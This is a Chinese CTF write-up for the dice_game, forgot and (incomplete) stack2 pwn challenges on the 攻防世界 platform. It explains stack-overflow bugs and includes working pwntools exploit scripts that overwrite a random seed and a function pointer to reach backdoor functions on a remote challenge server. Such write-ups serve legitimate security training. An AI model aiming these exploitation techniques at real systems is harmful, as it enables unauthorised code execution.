# 攻防世界PWN高手区详解-01

## dice_game

首先检查一下程序

```c
syc@ubuntu:~/Desktop/share/攻防世界PWN/dice_game$ checksec dice_game
[*] '/mnt/hgfs/share/\xe6\x94\xbb\xe9\x98\xb2\xe4\xb8\x96\xe7\x95\x8cPWN/dice_game/dice_game'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

然后看一起反汇编的代码

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char buf[55]; // [rsp+0h] [rbp-50h]
  char v5; // [rsp+37h] [rbp-19h]
  ssize_t v6; // [rsp+38h] [rbp-18h]
  unsigned int seed[2]; // [rsp+40h] [rbp-10h]
  unsigned int v8; // [rsp+4Ch] [rbp-4h]

  memset(buf, 0, 0x30uLL);
  *(_QWORD *)seed = time(0LL);
  printf("Welcome, let me know your name: ", a2);
  fflush(stdout);
  v6 = read(0, buf, 0x50uLL);
  if ( v6 <= 49 )
    buf[v6 - 1] = 0;
  printf("Hi, %s. Let's play a game.\n", buf);
  fflush(stdout);
  srand(seed[0]);
  v8 = 1;
  v5 = 0;
  while ( 1 )
  {
    printf("Game %d/50\n", v8);
    v5 = sub_A20();
    fflush(stdout);
    if ( v5 != 1 )
      break;
    if ( v8 == 50 )
    {
      getflag((__int64)buf);
      break;
    }
    ++v8;
  }
  puts("Bye bye!");
  return 0LL;
}
```

简单来说就是系统会设置一个种子随机数，然后我们连续猜对50次就能拿到flag，但是因为是随机数，所以我们不可能暴力爆破，我们应该去修改种子数，以下代码表明程序存在栈溢出

```c
char buf[55]; // [rsp+0h] [rbp-50h]
v6 = read(0, buf, 0x50uLL);
```

然后我们观察，buf的地址和seed的地址偏移只差0x40个字节，那么我们可以设定seed的种子数

```c
char buf[55]; // [rsp+0h] [rbp-50h]
unsigned int seed[2]; // [rsp+40h] [rbp-10h]
```

开写EXP

```python
from pwn import *
from ctypes import *
p=remote('111.198.29.45','53746')
libc = cdll.LoadLibrary("libc.so.6")
p.recv() #吃掉第一个回显
payload=0x40*"a"+p64(0) #设定种子数为0
p.sendline(payload)

a=[]
for i in range(50):
    a.append(libc.rand()%6+1) #产生50个随机数
print(a)
for i in a:
    p.recv()
    print(p.recv())
    p.sendline(str(i))
p.interactive()
```

这里有一个Tips

```python
from ctypes import *
libc = cdll.LoadLibrary("libc.so.6")
```

这里我们是为了直接调用程序给的libc库，确保我们使用产生随机数的方法是一样的

## forgot

首先检查一下程序

```c
syc@ubuntu:~/Desktop/share/攻防世界PWN/forgot$ checksec forgot
[*] '/mnt/hgfs/share/\xe6\x94\xbb\xe9\x98\xb2\xe4\xb8\x96\xe7\x95\x8cPWN/forgot/forgot'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

然后看一起反汇编的代码

```c
int __cdecl main()
{
  size_t v0; // ebx
  char v2[32]; // [esp+10h] [ebp-74h]
  int (*v3)(); // [esp+30h] [ebp-54h]
  int (*v4)(); // [esp+34h] [ebp-50h]
  int (*v5)(); // [esp+38h] [ebp-4Ch]
  int (*v6)(); // [esp+3Ch] [ebp-48h]
  int (*v7)(); // [esp+40h] [ebp-44h]
  int (*v8)(); // [esp+44h] [ebp-40h]
  int (*v9)(); // [esp+48h] [ebp-3Ch]
  int (*v10)(); // [esp+4Ch] [ebp-38h]
  int (*v11)(); // [esp+50h] [ebp-34h]
  int (*v12)(); // [esp+54h] [ebp-30h]
  char s; // [esp+58h] [ebp-2Ch]
  int v14; // [esp+78h] [ebp-Ch]
  size_t i; // [esp+7Ch] [ebp-8h]

  v14 = 1;
  v3 = sub_8048604;
  v4 = sub_8048618;
  v5 = sub_804862C;
  v6 = sub_8048640;
  v7 = sub_8048654;
  v8 = sub_8048668;
  v9 = sub_804867C;
  v10 = sub_8048690;
  v11 = sub_80486A4;
  v12 = sub_80486B8;
  puts("What is your name?");
  printf("> ");
  fflush(stdout);
  fgets(&s, 32, stdin);
  sub_80485DD((int)&s);
  fflush(stdout);
  printf("I should give you a pointer perhaps. Here: %x\n\n", sub_8048654);
  fflush(stdout);
  puts("Enter the string to be validate");
  printf("> ");
  fflush(stdout);
  __isoc99_scanf("%s", v2);
  for ( i = 0; ; ++i )
  {
    v0 = i;
    if ( v0 >= strlen(v2) )
      break;
    switch ( v14 )
    {
      case 1:
        if ( sub_8048702(v2[i]) )               // a1 > '`' && a1 <= 'z' || a1 > '/' && a1 <= '9' || a1 == '_' || a1 == '-' || a1 == '+' || a1 == '.'
          v14 = 2;
        break;
      case 2:
        if ( v2[i] == 64 )
          v14 = 3;
        break;
      case 3:
        if ( sub_804874C(v2[i]) )               // a1 > '`' && a1 <= 'z' || a1 > '/' && a1 <= '9' || a1 == '_';
          v14 = 4;
        break;
      case 4:
        if ( v2[i] == 46 )
          v14 = 5;
        break;
      case 5:
        if ( sub_8048784(v2[i]) )               // a1 > '`' && a1 <= 'z';
          v14 = 6;
        break;
      case 6:
        if ( sub_8048784(v2[i]) )               // a1 > '`' && a1 <= 'z'
          v14 = 7;
        break;
      case 7:
        if ( sub_8048784(v2[i]) )               // a1 > '`' && a1 <= 'z';
          v14 = 8;
        break;
      case 8:
        if ( sub_8048784(v2[i]) )               // a1 > '`' && a1 <= 'z';
          v14 = 9;
        break;
      case 9:
        v14 = 10;
        break;
      default:
        continue;
    }
  }
  (*(&v3 + --v14))();                          
  return fflush(stdout);
}
```

这题关键点就是有一个可以操纵的指针，就实现了地址的任意执行

```c++
(*(&v3 + --v14))();                           
```

然后还有一个后门函数位于**0x080486CC**，通过查询字符串找到的

```c
int getflag()
{
  char s; // [esp+1Eh] [ebp-3Ah]

  snprintf(&s, 0x32u, "cat %s", "./flag");
  return system(&s);
}
```

然后有两个溢出点

```c
fgets(&s, 32, stdin);
__isoc99_scanf("%s", v2);
```

只有第二个有利用价值，因为第一个会因为第二个输入改变栈结构，先放EXP

```python
from pwn import *
#p = remote("111.198.29.45", 31755)
p = process("./forgot")
payload = 'a'*0x44 + p32(0x080486CC) + 'a'*0x20 + p32(0x8)
p.recvuntil(">")
p.sendline("bbb")
p.sendlineafter("> ", payload)
p.interactive()
```

现在来详解以下payload，首先是为了覆盖v12处的数据

```python
'a'*0x44 + p32(0x080486CC)
```

然后是为了覆盖v14处的数据，将v14处覆盖为8

```python
'a'*0x20 + p32(0x8)
```

然后会发生的事情是，首先是v3和v12的内存相差0x24的距离

```c
int (*v3)(); // [esp+30h] [ebp-54h]
int (*v12)(); // [esp+54h] [ebp-30h]
```

然后根据程序，此时v14 = 8，会触发

```c
case 8:
        if ( sub_8048784(v2[i]) )               // a1 > '`' && a1 <= 'z';
          v14 = 9;
        break;
```

然后因为我们填充的数据是`'a'*0x44`，符合调节，然后v14被修改为9，然后再下一次会触发

```c
      case 9:
        v14 = 10;
        break;
```

此时v14被修改为了10，指针指向v12，随后执行后门函数获得flag，其实也可以不那么困难，用上面都不符合的判定条件，不进入switch，此时v14就是0，指针就是v3本身，此时修改v3就可以了

```python
from pwn import *
p=remote('111.198.29.45',56015)
print p.recvuntil("> ")
p.sendline('A')
payload='A'*32+p32(0x080486cc)
print p.recvuntil("> ")
p.sendline(payload)
print p.recvall()
```

## stack2

首先检查一下程序

```c
syc@ubuntu:~/Desktop/share/攻防世界PWN/stack2$ checksec stack2
[*] '/mnt/hgfs/share/\xe6\x94\xbb\xe9\x98\xb2\xe4\xb8\x96\xe7\x95\x8cPWN/stack2/stack2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

然后在IDA中搜索字符串发现了后门函数hackhere

```c
int hackhere()
{
  return system("/bin/bash");
}
```

然后是IDA看看主函数

```

```

